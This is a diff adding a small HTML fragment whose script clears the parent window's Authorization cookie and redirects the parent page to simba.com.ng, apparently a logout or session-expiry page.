@@ -1,0 +1,3 @@
+<body><script language="javaScript">window.parent.document.cookie="Authorization=;path=/";
+window.parent.location.href = "http://simba.com.ng";
+</script></body></html>
